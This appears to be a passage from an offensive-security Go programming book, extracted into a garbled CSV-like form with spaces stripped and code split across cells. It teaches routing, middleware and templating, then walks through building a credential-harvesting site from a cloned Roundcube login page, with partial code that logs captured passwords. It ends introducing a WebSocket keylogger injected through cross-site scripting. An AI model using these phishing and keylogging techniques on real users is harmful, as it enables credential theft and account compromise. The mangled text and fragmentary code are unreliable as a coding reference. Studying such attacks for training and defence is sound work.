www.foo.com,NA,NA
:,"r.HandleFunc(""/foo"",func(whttp.ResponseWriter,req*http.Request){
  
  
 fmt.Fprint(w,""hifoo"")
  
  
 }).Methods(""GET"").Host(""www.foo.com"")",NA
Sometimesit’shelpfultomatchandpassinparameters,NA,NA
"withintherequestpath(forexample,whenimplementinga",NA,NA
RESTfulAPI).Thisissimplewith,gorilla/mux,NA
.Thefollowing,NA,NA
willprintoutanythingfollowing,/users/,NA
intherequest’spath:,"r.HandleFunc(""/users/{user}"",func(whttp.ResponseWriter,req*http.Request){
  
  
 user:=mux.Vars(req)[""user""]
  
  
 fmt.Fprintf(w,""hi%s\n"",user)
  
  
 }).Methods(""GET"")",NA
"Inthepathdefinition,youusebracestodefinearequest ",NA,NA
"parameter.Thinkofthisasanamedplaceholder.Then,inside ",NA,NA
"thehandlerfunction,youcall",mux.Vars(),NA
",passingittherequest",NA,NA
"object,whichreturnsa",map[string]string,NA
—amapofrequest,NA,NA
parameternamestotheirrespectivevalues.Youprovidethe ,NA,NA
namedplaceholder,user,NA
"asthekey.So,arequestto",/users/bob,NA
shouldproduceagreetingforBob:,"$
 curlhttp://localhost:8000/users/bob
  
  
 hibob",NA
Youcantakethisastepfurtherandusearegular ,NA,NA
"expressiontoqualifythepatternspassed.Forexample,you ",NA,NA
canspecifythatthe,user,NA
parametermustbelowercaseletters:,"r.HandleFunc(""/users/{user:[a-z]+}"",func(whttp.ResponseWriter,req
  
  
 *http.Request){
  
  
 user:=mux.Vars(req)[""user""]
  
  
 fmt.Fprintf(w,""hi%s\n"",user)
  
  
 }).Methods(""GET"")",NA
Anyrequeststhatdon’tmatchthispatternwillnowreturna ,NA,NA
404response:,"$
 curl-ihttp://localhost:8000/users/bob1
  
  
 HTTP/1.1404NotFound",NA
"Inthenextsection,we’llexpandonroutingtoinclude ",NA,NA
somemiddlewareimplementationsusingotherlibraries.Thi,NA,NA
s willgiveyouincreasedflexibilitywithhandlingHTTP ,NA,NA
requests.,NA,NA
BuildingMiddlewarewithNegroni,NA,NA
Thesimplemiddlewareweshowedearlierloggedthestartand ,NA,NA
endtimesofthehandlingoftherequestandreturnedthe ,NA,NA
response.Middlewaredoesn’thavetooperateonevery ,NA,NA
"incomingrequest,butmostofthetimethatwillbethecase. ",NA,NA
"Therearemanyreasonstousemiddleware,includinglogging ",NA,NA
"requests,authenticatingandauthorizingusers,andmapping ",NA,NA
resources.,NA,NA
"Forexample,youcouldwritemiddlewareforperforming ",NA,NA
basicauthentication.Itcouldparseanauthorizationheaderfo,NA,NA
"r eachrequest,validatetheusernameandpasswordprovided, ",NA,NA
andreturna401responseifthecredentialsareinvalid.You ,NA,NA
couldalsochainmultiplemiddlewarefunctionstogetherin ,NA,NA
"suchawaythatafteroneisexecuted,thenextonedefinedis run.",NA,NA
Fortheloggingmiddlewareyoucreatedearlierinthis ,NA,NA
"chapter,youwrappedonlyasinglefunction.Inpractice,thisis ",NA,NA
"notveryuseful,becauseyou’llwanttousemorethanone,and ",NA,NA
"todothis,youmusthavelogicthatcanexecutethemina ",NA,NA
"chain,oneafteranother.Writingthisfromscratchisnot ",NA,NA
"incrediblydifficult,butlet’snotre-createthewheel.Here, ",NA,NA
you’lluseamaturepackagethatisalreadyabletodothis: ,negroni,NA
.,NA,NA
The,negroni,NA
"package,whichyoucanfindat",NA,NA
https://github.com/urfave/negroni/,NA,NA
",isgreatbecauseitdoes",NA,NA
n’t tieyouintoalargerframework.Youcaneasilyboltitonto ,NA,NA
"otherframeworks,anditprovidesalotofflexibility.Italso ",NA,NA
comeswithdefaultmiddlewarethatisusefulformany ,NA,NA
"applications.Beforeyouhopin,youneedto",gogetnegroni,NA
:,"$
 gogetgithub.com/urfave/negroni",NA
Whileyoutechnicallycoulduse,negroni,NA
forallapplication,NA,NA
"logic,doingthisisfarfromidealbecauseit’spurpose-builtto ",NA,NA
"actasmiddlewareanddoesn’tincludearouter.Instead,it’s ",NA,NA
besttouse,negroni,NA
"incombinationwithanotherpackage,suchas",gorilla/mux,NA
or,net/http,NA
.Let’suse,gorilla/mux,NA
tobuildaprogramthat,NA,NA
willgetyouacquaintedwith,negroni,NA
andallowyoutovisualize,NA,NA
theorderofoperationsastheytraversethemiddlewarechain.,NA,NA
Startbycreatinganewfilecalled,NA,NA
main.go,NA,NA
withina ,NA,NA
"directorynamespace,suchas",NA,NA
github.com/blackhat-,NA,NA
go/bhg/ch-,NA,NA
4/negroni_example/,NA,NA
.(Thisnamespacewillalreadybecreated ,NA,NA
intheeventyouclonedtheBHGGithubrepository.)Now ,NA,NA
modifyyour,NA,NA
main.go,NA,NA
filetoincludethefollowingcode.,"packagemain
  
  
 import(
  
  
 ""net/http""
  
  
 ""github.com/gorilla/mux""
  
 ""github.com/urfave/negroni""
  
 )
  
  
 funcmain(){
  
 ❶r:=mux.NewRouter()
  
 ❷n:=negroni.Classic()
  
 ❸n.UseHandler(r) 
  
 http.ListenAndServe("":8000"",n)
  
  
 }
  
 Listing4-4:Negroniexample(
 /ch-4/negroni_example/main.go
 )",NA
"First,youcreatearouterasyoudidearlierinthischapter ",NA,NA
bycalling,mux.NewRouter(),NA
❶.Nextcomesyourfirstinteraction ,NA,NA
withthe,negroni,NA
package:youmakeacallto,negroni.Classic(),NA
❷. ,NA,NA
Thiscreatesanewpointertoa,Negroni,NA
instance.,NA,NA
Therearedifferentwaystodothis.Youcaneitheruse ,negroni.Classic(),NA
orcall,negroni.New(),NA
".Thefirst,",negroni.Classic(),NA
",sets",NA,NA
"updefaultmiddleware,includingarequestlogger,recovery ",NA,NA
"middlewarethatwillinterceptandrecoverfrompanics,and ",NA,NA
middlewarethatwillservefilesfromthepublicfolderinthe ,NA,NA
samedirectory.The,negroni.New(),NA
functiondoesn’tcreateany,NA,NA
defaultmiddleware.,NA,NA
Eachtypeofmiddlewareisavailableinthe,negroni,NA
package.,NA,NA
"Forexample,youcanusetherecoverypackagebydoingthe ",NA,NA
following:,n.Use(negroni.NewRecovery()),NA
"Next,youaddyourroutertothemiddlewarestackby ",NA,NA
calling,n.UseHandler(r),NA
❸.Asyoucontinuetoplanandbuildout ,NA,NA
"yourmiddleware,considertheorderofexecution.For ",NA,NA
"example,you’llwantyourauthentication-checking ",NA,NA
middlewaretorunpriortothehandlerfunctionsthatrequire ,NA,NA
authentication.Anymiddlewaremountedbeforetherouter ,NA,NA
willexecutepriortoyourhandlerfunctions;anymiddleware ,NA,NA
mountedaftertherouterwillexecuteafteryourhandler ,NA,NA
"functions.Ordermatters.Inthiscase,youhaven’tdefinedany ",NA,NA
"custommiddleware,butyouwillsoon.",NA,NA
Goaheadandbuildtheserveryoucreatedin,NA,NA
Listing4-4,NA,NA
", ",NA,NA
andthenexecuteit.Thenissuewebrequeststotheserverat ,NA,NA
http://localhost:8000,NA,NA
.Youshouldseethe,negroni,NA
logging,NA,NA
"middlewareprintinformationtostdout,asshownnext.The ",NA,NA
"outputshowsthetimestamp,responsecode,processingtime",NA,NA
", host,andHTTPmethod:","$
 gobuild-snegroni_example",NA
"Havingdefaultmiddlewareisgreatandall,butthereal ",NA,NA
powercomeswhenyoucreateyourown.With,negroni,NA
",youcan",NA,NA
useafewmethodstoaddmiddlewaretothestack.Takealook ,NA,NA
atthefollowingcode.Itcreatestrivialmiddlewarethatprintsa ,NA,NA
messageandpassesexecutiontothenextmiddlewareinthe ,NA,NA
chain:,"typetrivialstruct{
  
  
 }
  
  
 func(t*trivial)ServeHTTP(whttp.ResponseWriter,r*http.Request,next 
 http.HandlerFunc){❶
  
 fmt.Println(""Executingtrivialmiddleware"") 
  
 next(w,r)❷
  
 }",NA
Thisimplementationisslightlydifferentfromprevious ,NA,NA
"examples.Before,youwereimplementingthe",http.Handler,NA
"interface,whichexpecteda",ServeHTTP(),NA
methodthataccepted,NA,NA
twoparameters:,http.ResponseWriter,NA
and,*http.Request,NA
.Inthisnew,NA,NA
"example,insteadofthe",http.Handler,NA
"interface,you’re",NA,NA
implementingthe,negroni.Handler,NA
interface.,NA,NA
Theslightdifferenceisthatthe,negroni.Handler,NA
interface,NA,NA
expectsyoutoimplementa,ServeHTTP(),NA
methodthatacceptsnot,NA,NA
"two,butthree,parameters:",http.ResponseWriter,NA
",",*http.Request,NA
",and ",http.HandlerFunc,NA
❶.The,http.HandlerFunc,NA
parameterrepresentsthe ,NA,NA
"nextmiddlewarefunctioninthechain.Foryourpurposes,you ",NA,NA
nameit,next,NA
.Youdoyourprocessingwithin,ServeHTTP(),NA
",and ",NA,NA
thencall,next(),NA
"❷,passingitthe",http.ResponseWriter,NA
and,*http.Request,NA
valuesyouoriginallyreceived.Thiseffectivelytransfers,NA,NA
executiondownthechain.,NA,NA
Butyoustillhavetotell,negroni,NA
touseyourimplementation,NA,NA
aspartofthemiddlewarechain.Youcandothisbycalling ,negroni,NA
’s,Use,NA
methodandpassinganinstanceofyour,negroni.Handler,NA
implementationtoit:,n.Use(&trivial{}),NA
Writingyourmiddlewarebyusingthismethodis ,NA,NA
convenientbecauseyoucaneasilypassexecutiontothenext ,NA,NA
middleware.Thereisonedrawback:anythingyouwritemust ,NA,NA
use,negroni,NA
".Forexample,ifyouwerewritingamiddleware",NA,NA
"packagethatwritessecurityheaderstoaresponse,youwould ",NA,NA
wantittoimplement,http.Handler,NA
",soyoucoulduseitinother",NA,NA
"applicationstacks,sincemoststackswon’texpecta ",negroni.Handler,NA
".Thepointis,regardlessofyourmiddleware’s",NA,NA
"purpose,compatibilityissuesmayarisewhentryingtouse ",negroni,NA
middlewareinanon-,negroni,NA
"stack,andviceversa.",NA,NA
Therearetwootherwaystotell,negroni,NA
touseyour,NA,NA
middleware.,UseHandler(handlerhttp.Handler),NA
",whichyou’realready",NA,NA
"familiarwith,isthefirst.Thesecondwayistocall ","UseHandleFunc(handlerFuncfunc(whttp.ResponseWriter,r*http.Request))",NA
.Th,NA,NA
e,NA,NA
"latterisnotsomethingyou’llwanttouseoften,sinceitdoesn’t ",NA,NA
letyouforgoexecutionofthenextmiddlewareinthechain.,NA,NA
"Forexample,ifyouwerewritingmiddlewaretoperform ",NA,NA
"authentication,youwouldwanttoreturna401responseand ",NA,NA
stopexecutionifanycredentialsorsessioninformationwere ,NA,NA
"invalid;withthismethod,there’snowaytodothat.",NA,NA
AddingAuthenticationwithNegroni,NA,NA
"Beforemovingon,let’smodifyourexamplefromtheprevious",NA,NA
sectiontodemonstratetheuseof,context,NA
",whichcaneasilypass",NA,NA
variablesbetweenfunctions.Theexamplein,NA,NA
Listing4-5,NA,NA
uses,negroni,NA
toaddauthenticationmiddleware.,"packagemain
  
 import( 
  
 ""context"" 
  
 ""fmt"" 
  
 ""net/http""
  
 ""github.com/gorilla/mux"" 
  
 ""github.com/urfave/negroni"" 
  
 )
  
 typebadAuthstruct{❶
  
 Usernamestring 
  
 Passwordstring 
  
 }
  
 func(b*badAuth)ServeHTTP(whttp.ResponseWriter,r*http.Request,next 
 http.HandlerFunc){❷
  
 username:=r.URL.Query().Get(""username"")❸
  
 password:=r.URL.Query().Get(""password"")
  
 ifusername!=b.Username||password!=b.Password{
  
 http.Error(w,""Unauthorized"",401) 
  
 return❹
  
 } 
  
 ctx:=context.WithValue(r.Context(),""username"",username)❺r=
 r.WithContext(ctx)❻
  
 next(w,r)
  
 }
  
 funchello(whttp.ResponseWriter,r*http.Request){ 
 username:=r.Context().Value(""username"").(string)❼f
 mt.Fprintf(w,""Hi%s\n"",username)
  
  
 }",NA
"You’veaddednewmiddleware,",badAuth,NA
",thatisgoingto ",NA,NA
"simulateauthentication,purelyfordemonstrationpurposes",NA,NA
❶.,NA,NA
"Thisnewtypehastwofields,",Username,NA
and,Password,NA
",and",NA,NA
implements,negroni.Handler,NA
",sinceitdefinesthethree-",NA,NA
parameter ,NA,NA
versionofthe,ServeHTTP(),NA
method❷wediscussedpreviously. ,NA,NA
Insidethe,ServeHTTP(),NA
"method,youfirstgrabtheusernameand ",NA,NA
"passwordfromtherequest❸,andthencomparethemtothe ",NA,NA
"fieldsyouhave.Iftheusernameandpasswordareincorrect,",NA,NA
"executionisstopped,anda401responseiswrittentothe",NA,NA
requester.,NA,NA
Noticethatyoureturn❹beforecalling,next(),NA
.Thisprevents ,NA,NA
theremainderofthemiddlewarechainfromexecuting.Ifthe,NA,NA
"credentialsarecorrect,yougothrougharatherverboseroutine",NA,NA
ofaddingtheusernametotherequestcontext.Youfirstcall,context.WithValue(),NA
"toinitializethecontextfromtherequest, ",NA,NA
settingavariablenamed,username,NA
onthatcontext❺.Youthen ,NA,NA
makesuretherequestusesyournewcontextbycalling ,r.WithContext(ctx),NA
❻.Ifyouplanonwritingwebapplications ,NA,NA
"withGo,you’llwanttobecomefamiliarwiththispattern,as",NA,NA
you’llbeusingitalot.,NA,NA
Inthe,hello(),NA
"function,yougettheusernamefromthe",NA,NA
requestcontextbyusingthe,Context().Value(interface{}),NA
"function,",NA,NA
whichitselfreturnsan,interface{},NA
.Becauseyouknowit’sa ,NA,NA
"string,youcanuseatypeassertionhere❼.Ifyoucan’t ",NA,NA
"guaranteethetype,oryoucan’tguaranteethatthevaluewill",NA,NA
"existinthecontext,usea",switch,NA
routineforconversion.,NA,NA
Buildandexecutethecodefrom,NA,NA
Listing4-5,NA,NA
andsendafew ,NA,NA
requeststotheserver.Sendsomewithbothcorrectand ,NA,NA
incorrectcredentials.Youshouldseethefollowingoutput:,"$
 curl-ihttp://localhost:8000/hello
  
 HTTP/1.1401Unauthorized 
  
 Content-Type:text/plain;charset=utf-8 
  
 X-Content-Type-Options:nosniff 
  
 Date:Thu,16Jan202020:41:20GMT 
  
 Content-Length:13 
  
 Unauthorized 
  
 $
 curl-
 i'http://localhost:8000/hello?username=admin&password=password' 
 HTTP/1.1200OK 
  
 Date:Thu,16Jan202020:41:05GMT 
  
 Content-Length:9
  
 Content-Type:text/plain;charset=utf-8
  
  
 Hiadmin",NA
Makingarequestwithoutcredentialsresultsinyour ,NA,NA
middlewarereturninga401Unauthorizederror.Sendingth,NA,NA
e,NA,NA
samerequestwithavalidsetofcredentialsproducesasuper-,NA,NA
secretgreetingmessageaccessibleonlytoauthenticatedusers,NA,NA
.,NA,NA
"Thatwasanawfullottodigest.Uptothispoint,your ",NA,NA
handlerfunctionshavesolelyused,fmt.FPrintf(),NA
towriteyour,NA,NA
responsetothe,http.ResponseWriter,NA
"instance.Inthenextsection,",NA,NA
you’lllookatamoredynamicwayofreturningHTMLby ,NA,NA
usingGo’stemplatingpackage.,NA,NA
UsingTemplatestoProduceHTMLResponses,NA,NA
Templates,NA,NA
"allowyoutodynamicallygeneratecontent, ",NA,NA
"includingHTML,withvariablesfromGoprograms.Many ",NA,NA
languageshavethird-,NA,NA
partypackagesthatallowyoutogenerate ,NA,NA
"templates.Gohastwotemplatingpackages,",text/template,NA
and,html/template,NA
".Inthischapter,you’llusetheHTMLpackage,",NA,NA
becauseitprovidesthecontextualencodingyouneed.,NA,NA
OneofthefantasticthingsaboutGo’spackageisthatit’s ,NA,NA
contextuallyaware:itwillencodeyourvariabledifferently ,NA,NA
dependingonwherethevariableisplacedinthetemplate.For ,NA,NA
"example,ifyouweretosupplyastringasaURLtoan",href,NA
"attribute,thestringwouldbeURLencoded,butthesame ",NA,NA
stringwouldbeHTMLencodedifitrenderedwithinan ,NA,NA
HTMLelement.,NA,NA
"Tocreateandusetemplates,youfirstdefineyourtemplate, ",NA,NA
whichcontainsaplaceholdertodenotethedynamiccontextua,NA,NA
l datatorender.Itssyntaxshouldlookfamiliartoreaderswho ,NA,NA
"haveusedJinjawithPython.Whenyourenderthetemplate, ",NA,NA
youpasstoitavariablethat’llbeusedasthiscontext.The ,NA,NA
"variablecanbeacomplexstructurewithseveralfields,orit ",NA,NA
canbeaprimitivevariable.,NA,NA
"Let’sworkthroughasample,shownin",NA,NA
Listing4-6,NA,NA
",that ",NA,NA
createsasimpletemplateandpopulatesaplaceholderwith ,NA,NA
JavaScript.Thisisacontrivedexamplethatshowshowto ,NA,NA
dynamicallypopulatecontentreturnedtothebrowser.,NA,NA
"Thefirstthingyoudoiscreateavariable,named",x,NA
",tostore ",NA,NA
yourHTMLtemplate❶.Hereyou’reusingastringembedded ,NA,NA
"inyourcodetodefineyourtemplate,butmostofthetime ",NA,NA
you’llwanttostoreyourtemplatesasseparatefiles.Notice ,NA,NA
thatthetemplateisnothingmorethanasimpleHTMLpage.,NA,NA
"Insidethetemplate,youdefineplaceholdersbyusingthe ","{{
 variable-name
 }}",NA
"convention,where",variable-name,NA
isthedata,NA,NA
elementwithinyourcontextualdatathatyou’llwanttorender,NA,NA
❷.Recallthatthiscanbeastructoranotherprimitive.Inthis ,NA,NA
"case,you’reusingasingleperiod,whichtellsthepackagethat ",NA,NA
youwanttorendertheentirecontexthere.Sinceyou’llbe ,NA,NA
"workingwithasinglestring,thisisfine,butifyouhadalarger",NA,NA
"andmorecomplexdatastructure,suchasastruct,youcould ",NA,NA
getonlythefieldsyouwantbycallingpastthisperiod.For ,NA,NA
"example,ifyoupassedastructwitha",Username,NA
fieldtothe,NA,NA
"template,youcouldrenderthefieldbyusing",{{.Username}},NA
.,NA,NA
"Next,inyour",main(),NA
"function,youcreateanewtemplateby ",NA,NA
calling,"template.New(
 string
 )",NA
❸.Thenyoucall,"Parse(
 string
 )",NA
toensure ,NA,NA
thatthetemplateisproperlyformattedandtoparseit.,NA,NA
"Together,thesetwofunctionsreturnanewpointertoa ",Template,NA
.,NA,NA
"Whilethisexampleusesonlyasingletemplate,it’s ",NA,NA
possibletoembedtemplatesinothertemplates.Whenusing ,NA,NA
"multipletemplates,it’simportantthatyounametheminorder ",NA,NA
"tobeabletocallthem.Finally,youcall","Execute(
 io.Writer
 , 
  
 interface
 {})",NA
"❹,whichprocessesthetemplatebyusingthe ",NA,NA
variablepassedasthesecondargumentandwritesittothe ,NA,NA
provided,io.Writer,NA
".Fordemonstrationpurposes,you’lluse",os.Stdout,NA
.Thesecondvariableyoupassintothe,Execute(),NA
method,NA,NA
isthecontextthat’llbeusedforrenderingthetemplate.,NA,NA
"RunningthisproducesHTML,andyoushouldnoticethat ",NA,NA
thescripttagsandothernefariouscharactersthatwere ,NA,NA
providedaspartofyourcontextareproperlyencoded.Neat-o!,"$
 gobuild-otemplate_example
  
  
 $
 ./template_example
  
  
 <html>
  
  
 <body>
  
  
 Hello
 &lt;script&gt;alert(&#39;world&#39;)&lt;/script&gt;
  
  
 </body>
  
  
 </html>",NA
Wecouldsayalotmoreabouttemplates.Youcanuse,NA,NA
logicaloperatorswiththem;youcanusethemwithloopsand ,NA,NA
"othercontrolstructures.Youcancallbuilt-infunctions,and ",NA,NA
youcanevendefineandexposearbitraryhelperfunctionsto ,NA,NA
greatlyexpandthetemplatingcapabilities.Doubleneat-o!We ,NA,NA
recommendyoudiveinandresearchthesepossibilities.,NA,NA
"They’rebeyondthescopeofthisbook,butarepowerful.",NA,NA
Howaboutyoustepawayfromthebasicsofcreating ,NA,NA
serversandhandlingrequestsandinsteadfocusonsomethin,NA,NA
g morenefarious.Let’screateacredentialharvester!,NA,NA
CREDENTIALHARVESTING,NA,NA
Oneofthestaplesofsocialengineeringisthe,NA,NA
credential-,NA,NA
harvestingattack,NA,NA
.Thistypeofattackcapturesusers’login ,NA,NA
informationtospecificwebsitesbygettingthemtoentertheir ,NA,NA
credentialsinaclonedversionoftheoriginalsite.Theattack ,NA,NA
isusefulagainstorganizationsthatexposeasingle-factor ,NA,NA
authenticationinterfacetotheinternet.Onceyouhaveauser’s ,NA,NA
"credentials,youcanusethemtoaccesstheiraccountonthe ",NA,NA
actualsite.Thisoftenleadstoaninitialbreachofthe ,NA,NA
organization’sperimeternetwork.,NA,NA
"Goprovidesagreatplatformforthistypeofattack, ",NA,NA
"becauseit’squicktostandupnewservers,andbecauseit ",NA,NA
makesiteasytoconfigureroutingandtoparseuser-supplied ,NA,NA
input.Youcouldaddmanycustomizationsandfeaturestoa ,NA,NA
"credential-harvestingserver,butforthisexample,let’sstickto ",NA,NA
thebasics.,NA,NA
"Tobegin,youneedtocloneasitethathasaloginform.",NA,NA
"Therearealotofpossibilitieshere.Inpractice,you’d ",NA,NA
probablywanttocloneasiteinusebythetarget.Forthis,NA,NA
"example,though,you’llcloneaRoundcubesite.",NA,NA
Roundcube,NA,NA
is ,NA,NA
anopensourcewebmailclientthat’snotusedasoftenas ,NA,NA
"commercialsoftware,suchasMicrosoftExchange,butwill ",NA,NA
allowustoillustratetheconceptsjustaswell.You’lluse ,NA,NA
"DockertorunRoundcube,becauseitmakestheprocesseasier.",NA,NA
YoucanstartaRoundcubeserverofyourownby ,NA,NA
executingthefollowing.Ifyoudon’twanttorunaRoundcube ,NA,NA
"server,thennoworries;theexercisesourcecodehasacloneof ",NA,NA
"thesite.Still,we’reincludingthisforcompleteness:","$
 dockerrun--rm-it-p127.0.0.180:80robbertkl/roundcube",NA
ThecommandstartsaRoundcubeDockerinstance.Ifyou ,NA,NA
navigateto,NA,NA
http://127.0.0.1:80,NA,NA
",you’llbepresentedwitha ",NA,NA
"loginform.Normally,you’duse",wget,NA
tocloneasiteandallits,NA,NA
"requisitefiles,butRoundcubehasJavaScriptawesomenes",NA,NA
s ,NA,NA
"thatpreventsthisfromworking.Instead,you’lluseGoogle ",NA,NA
"Chrometosaveit.Intheexercisefolder,youshouldseea ",NA,NA
directorystructurethatlookslike,NA,NA
Listing4-7,NA,NA
.,"$
 tree
  
 .
  
 +--main.go 
  
 +--public 
  
 +--index.html 
  
 +--index_files 
  
 +--app.js 
  
 +--common.js 
  
 +--jquery-ui-1.10.4.custom.css 
  
 +--jquery-ui-1.10.4.custom.min.js 
  
 +--jquery.min.js 
  
 +--jstz.min.js 
  
 +--roundcube_logo.png 
  
 +--styles.css
  
 +--ui.js",NA
Thefilesinthe,NA,NA
public,NA,NA
directoryrepresenttheunaltered ,NA,NA
clonedloginsite.You’llneedtomodifytheoriginallogin ,NA,NA
"formtoredirecttheenteredcredentials,sendingthemto ",NA,NA
"yourselfinsteadofthelegitimateserver.Tobegin,open ",NA,NA
public/index.html,NA,NA
andfindtheformelementusedtoPOSTthe ,NA,NA
loginrequest.Itshouldlooksomethinglikethefollowing:,"<formname=""form""method=""post""action=""http://127.0.0.1/?_task=login"">",NA
Youneedtomodifythe,action,NA
attributeofthistagandpoint,NA,NA
ittoyourserver.Change,action,NA
to,/login,NA
.Don’tforgettosaveit.,NA,NA
Thelineshouldnowlooklikethefollowing:,"<formname=""form""method=""post""action=""/login"">",NA
Torendertheloginformcorrectlyandcaptureausername ,NA,NA
"andpassword,you’llfirstneedtoservethefilesinthe",NA,NA
public ,NA,NA
directory.Thenyou’llneedtowritea,HandleFunc,NA
for,/login,NA
to,NA,NA
capturetheusernameandpassword.You’llalsowanttostore ,NA,NA
thecapturedcredentialsinafilewithsomeverboselogging.,NA,NA
Youcanhandleallofthisinjustafewdozenlinesofcode. ,NA,NA
Listing4-8,NA,NA
showstheprograminitsentirety.,"packagemain
  
  
 import(
  
 ""net/http"" 
  
 ""os""
  
 ""time""
  
  
 log""github.com/Sirupsen/logrus""❶",NA
Thefirstthingworthnotingisyouimport ,github.com/Sirupsen/logrus,NA
❶.Thisisastructuredloggingpackage ,NA,NA
thatweprefertouseinsteadofthestandardGo,log,NA
package.It,NA,NA
providesmoreconfigurableloggingoptionsforbettererror ,NA,NA
"handling.Tousethispackage,you’llneedtomakesureyou",NA,NA
ran,goget,NA
beforehand.,NA,NA
"Next,youdefinethe",login(),NA
"handlerfunction.Hopefully,this",NA,NA
"patternlooksfamiliar.Insidethisfunction,youuse",NA,NA
towriteoutyourcaptureddata❷.Youdisplay ,NA,NA
"thecurrenttime,theuser-agent,andIPaddressofthe ",NA,NA
requester.Youalsocall,"FormValue(
 string
 )",NA
tocaptureboththe ,NA,NA
username(,_user,NA
)❸andpassword(,_pass,NA
)❹valuesthatwere ,NA,NA
submitted.Yougetthesevaluesfrom,NA,NA
index.html,NA,NA
andby ,NA,NA
locatingtheforminputelementsforeachusernameand ,NA,NA
password.Yourserverneedstoexplicitlyalignwiththenames ,NA,NA
ofthefieldsastheyexistintheloginform.,NA,NA
"Thefollowingsnippet,extractedfrom",NA,NA
index.html,NA,NA
",shows ",NA,NA
"therelevantinputitems,withtheelementnamesinboldfor ",NA,NA
clarity:,"<tdclass=""input""><inputname=""
 _user
 ""id=""rcmloginuser""required=""required""
  
  
 size=""40""autocapitalize=""off""autocomplete=""off""type=""text""></td>
  
  
 <tdclass=""input""><inputname=""
 _pass
 ""id=""rcmloginpwd""required=""required""
  
  
 size=""40""autocapitalize=""off""autocomplete=""off""type=""password""></td>",NA
Inyour,main(),NA
"function,youbeginbyopeningafilethat’ll ",NA,NA
"beusedtostoreyourcaptureddata❺.Then,youuse ","log.SetOutput(
 io.Writer
 )",NA
",passingitthefilehandleyoujustcreated,",NA,NA
toconfiguretheloggingpackagesothatit’llwriteitsoutputto ,NA,NA
"thatfile❻.Next,youcreateanewrouterandmountthe",login(),NA
handlerfunction❼.,NA,NA
"Priortostartingtheserver,youdoonemorethingthatmay ",NA,NA
lookunfamiliar:youtellyourroutertoservestaticfilesfroma ,NA,NA
"directory❽.Thatway,yourGoserverexplicitlyknowswhere ",NA,NA
"yourstaticfiles—images,JavaScript,HTML—live.Gomakes ",NA,NA
"thiseasy,andprovidesprotectionsagainstdirectorytraversal ",NA,NA
"attacks.Startingfromtheinsideout,youuse","http.Dir(
 string
 )",NA
to,NA,NA
definethedirectoryfromwhichyouwishtoservethefiles. ,NA,NA
Theresultofthisispassedasinputto,"http.FileServer(
 FileSystem
 )",NA
",",NA,NA
whichcreatesan,http.Handler,NA
foryourdirectory.You’llmount,NA,NA
thistoyourrouterbyusing,"PathPrefix(
 string
 )",NA
.Using,/,NA
asapath,NA,NA
prefixwillmatchanyrequestthathasn’talreadyfounda ,NA,NA
"match.Notethat,bydefault,thehandlerreturnedfrom ",FileServer,NA
doessupportdirectoryindexing.Thiscouldleaksome,NA,NA
"information.It’spossibletodisablethis,butwewon’tcover ",NA,NA
thathere.,NA,NA
"Finally,asyouhavebefore,youstarttheserver.Once ",NA,NA
you’vebuiltandexecutedthecodein,NA,NA
Listing4-8,NA,NA
",openyour ",NA,NA
webbrowserandnavigateto,NA,NA
http://localhost:8080,NA,NA
.Try ,NA,NA
submittingausernameandpasswordtotheform.Thenhead ,NA,NA
"backtotheterminal,exittheprogram,andviewthe ",NA,NA
credentials.txt,NA,NA
"file,shownhere:","$
 gobuild-ocredential_harvester
  
  
 $
 ./credential_harvester
  
  
 ^C
  
  
 $
 catcredentials.txt
  
  
 INFO[0038]loginattempt
  
  
 ip_address=""127.0.0.1:34040""password=""p@ssw0rd1!""time=""2020-02-13
  
  
 21:29:37.048572849-0800PST""user-agent=""Mozilla/5.0(X11;Ubuntu;Linux
  
  
 x86_64;
  
  
 rv:51.0)Gecko/20100101Firefox/51.0""username=bob",NA
Lookatthoselogs!Youcanseethatyousubmittedthe ,NA,NA
usernameof,bob,NA
andthepasswordof,p@ssw0rd1!,NA
.Your,NA,NA
"maliciousserversuccessfullyhandledtheformPOSTrequest, ",NA,NA
"capturedtheenteredcredentials,andsavedthemtoafilefor ",NA,NA
"offlineviewing.Asanattacker,youcouldthenattempttouse ",NA,NA
thesecredentialsagainstthetargetorganizationandproceed ,NA,NA
withfurthercompromise.,NA,NA
"Inthenextsection,you’llworkthroughavariationofthis ",NA,NA
credential-harvestingtechnique.Insteadofwaitingforform,NA,NA
"submission,you’llcreateakeyloggertocapturekeystrokesin ",NA,NA
realtime.,NA,NA
KEYLOGGINGWITHTHE ,NA,NA
WEBSOCKETAPI,NA,NA
The,NA,NA
WebSocketAPI(WebSockets),NA,NA
",afullduplexprotocol,has ",NA,NA
increasedinpopularityovertheyearsandmanybrowsersnow ,NA,NA
supportit.Itprovidesawayforwebapplicationserversand ,NA,NA
clientstoefficientlycommunicatewitheachother.Most ,NA,NA
"importantly,itallowstheservertosendmessagestoaclient ",NA,NA
withouttheneedforpolling.,NA,NA
WebSocketsareusefulforbuilding“real-time”,NA,NA
"applications,suchaschatandgames,butyoucanusethemfor ",NA,NA
"nefariouspurposesaswell,suchasinjectingakeyloggerinto ",NA,NA
"anapplicationtocaptureeverykeyauserpresses.Tobegin, ",NA,NA
imagineyou’veidentifiedanapplicationthatisvulnerableto ,NA,NA
cross-sitescripting,NA,NA
(aflawthroughwhichathirdpartycanrun ,NA,NA
arbitraryJavaScriptinavictim’sbrowser)oryou’ve ,NA,NA
"compromisedawebserver,allowingyoutomodifythe ",NA,NA
applicationsourcecode.Eitherscenarioshouldletyouinclude ,NA,NA
aremoteJavaScriptfile.You’llbuildtheserverinfrastructure ,NA,NA
tohandleaWebSocketconnectionfromaclientandhandle ,NA,NA
incomingkeystrokes.,NA,NA
"Fordemonstrationpurposes,you’lluseJSBin ",NA,NA
(,NA,NA
http://jsbin.com,NA,NA
)totestyourpayload.JSBinisanonline ,NA,NA
playgroundwheredeveloperscantesttheirHTMLand ,NA,NA
JavaScriptcode.NavigatetoJSBininyourwebbrowserand ,NA,NA
"pastethefollowingHTMLintothecolumnontheleft, ",NA,NA
completelyreplacingthedefaultcode:,NA,NA
"Ontherightsideofthescreen,you’llseetherendered ",NA,NA
"form.Asyoumayhavenoticed,you’veincludeda",script,NA
tag,NA,NA
withthe,src,NA
attributesetto,http://localhost:8080/k.js,NA
.Thisisgoingto,NA,NA
betheJavaScriptcodethatwillcreatetheWebSocket ,NA,NA
connectionandsenduserinputtotheserver.,NA,NA
Yourserverisgoingtoneedtodotwothings:handlethe,NA,NA
"WebSocketandservetheJavaScriptfile.First,let’sgetthe ",NA,NA
"JavaScriptoutoftheway,sinceafterall,thisbookisabout ",NA,NA
